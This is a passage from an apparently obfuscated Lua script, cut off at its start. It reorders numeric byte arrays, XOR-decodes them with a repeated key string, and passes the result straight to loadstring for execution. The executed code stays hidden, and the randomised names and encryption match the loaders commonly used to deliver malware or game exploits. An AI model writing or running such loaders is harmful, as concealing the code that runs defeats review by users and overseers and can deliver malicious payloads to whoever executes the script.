{98,23,67,82,70,13,64,83,3,9,31,3,29,2,8,84,73,0,13,11,10,23,3,83,6},
{11,23,11,61,46,26,3,65,70,5,0,30,19,20,3,28,4,4,10,31,8,19,27,12,15},

{11,3,34,65,7,29,40,11,18,88,53,4,11,0,54,31,71,93,8,16,4,111,45,1,30},
{73,89,76,95,69,32,11,72,74,83,78,83,72,75,72,68,27,111,72,93,8,82,91,95,65},
{2,18,15,2,75,75,49,4,13,4,8,4,26,19,8,80,67,77,79,78,89,100,75,0,1},
{93,87,118,82,74,70,91,2,121,90,73,67,77,16,11,31,10,14,34,23,10,22,26,50,23},

}

local mAkODZwX = {151,51,162,169,6,3,123,49,95,21,39,82,33,98,94,108,5,50,24,111,59,88,141,130,76,53,18,144,65,136,115,7,157,92,83,142,20,114,2,74,127,71,80,129,48,41,75,22,84,102,68,171,27,11,63,93,64,146,133,128,87,8,15,122,149,148,99,28,31,12,134,155,120,101,110,97,58,30,116,104,38,32,79,85,62,170,156,96,9,161,106,44,36,66,81,40,25,57,69,29,73,61,152,34,118,150,55,160,42,158,165,125,43,143,26,107,10,103,45,47,89,139,132,164,163,145,72,91,35,90,105,56,124,159,100,54,60,23,19,86,138,126,4,13,137,46,112,17,119,52,154,166,168,37,117,16,77,140,14,70,78,153,167,113,135,1,67,147,109,131,121}
local dGmRpkEa = "jsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+h"

local function gbqANfSA(data, order, key)
    local merged = {}
    for i = 1, #order do
        merged[order[i]] = data[i]
    end

    local result = ""
    local index = 1

    for i = 1, #merged do
        for j = 1, #merged[i] do
            local k = string.byte(key, ((index - 1) % #key) + 1)
            result = result .. string.char(bit32.bxor(merged[i][j], k))
            index = index + 1
        end
    end

    return result
end

local uyUPHoaf = gbqANfSA(xPFwWFyj, mAkODZwX, dGmRpkEa)
loadstring(uyUPHoaf)()
